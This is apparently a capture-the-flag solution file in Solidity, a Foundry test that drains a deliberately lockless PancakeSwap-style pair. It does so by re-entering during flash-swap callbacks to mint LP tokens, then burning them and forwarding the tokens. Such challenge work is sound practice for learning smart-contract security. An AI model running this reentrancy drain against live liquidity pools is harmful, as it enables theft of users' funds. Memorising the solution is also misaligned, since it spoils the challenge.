// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "../../src/day01/ERC20.sol";
import {PancakePair} from "../../src/day01/LocklessPancakePair.sol";
import {Test, console2} from "forge-std/Test.sol";

contract Token0 is ERC20 {
    constructor() ERC20("Token0", "Token0") {
        _mint(msg.sender, 100 * 1e18);
    }
}

contract Token1 is ERC20 {
    constructor() ERC20("Token1", "Token1") {
        _mint(msg.sender, 100 * 1e18);
    }
}

contract Challenge {
    ERC20 public token0;
    ERC20 public token1;

    PancakePair public pair;

    address public randomFolks = address(0xf2331a2d);

    constructor() {
        // deploy tokens
        token0 = new Token0();
        token1 = new Token1();

        // create pairs for token1 / token2
        pair = new PancakePair();
        pair.initialize(address(token0), address(token1));

        // add liquidity for the pair
        token0.transfer(address(pair), 99 * 1e18);
        token1.transfer(address(pair), 99 * 1e18);
        pair.mint(address(this));
    }

    function faucet() public {
        token0.transfer(msg.sender, 1 * 1e18);
        token1.transfer(msg.sender, 1 * 1e18);
    }

    function isSolved() public view returns (bool) {
        return
            token1.balanceOf(address(randomFolks)) >= 99 * 1e18 && token0.balanceOf(address(randomFolks)) >= 99 * 1e18;
    }
}

contract SolveTest is Test {
    Challenge challenge;

    function setUp() public {
        challenge = new Challenge();
    }

    function _burnLP(uint256 amount) internal {
        address to = address(challenge.pair());
        challenge.pair().transfer(to, amount);
        challenge.pair().burn(address(this));
    }

    function _sendToken() internal {
        address folk = challenge.randomFolks();

        uint256 amount0 = challenge.token0().balanceOf(address(this));
        uint256 amount1 = challenge.token1().balanceOf(address(this));
        console2.log(amount0 / 1e18);
        console2.log(amount1 / 1e18);

        challenge.token0().transfer(folk, amount0);
        challenge.token1().transfer(folk, amount1);
    }

    function testExploit() external {
        challenge.faucet();

        uint256 amount0 = 39 ether;
        uint256 amount1 = 39 ether;
        for (uint256 i = 0; i < 10; i++) {
            challenge.pair().swap(amount0, amount1, address(this), "NoOps");
        }

        uint256 amount = challenge.pair().balanceOf(address(this));
        _burnLP(amount);

        _sendToken();

        assertTrue(challenge.isSolved());
    }

    function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes calldata data) external {
        challenge.pair().sync();
        address pair = address(challenge.pair());

        challenge.token0().transfer(pair, amount0Out);
        challenge.token1().transfer(pair, amount1Out);

        challenge.pair().mint(address(this));
        challenge.token0().transfer(pair, 0.1 ether);
        challenge.token1().transfer(pair, 0.1 ether);
    }
}
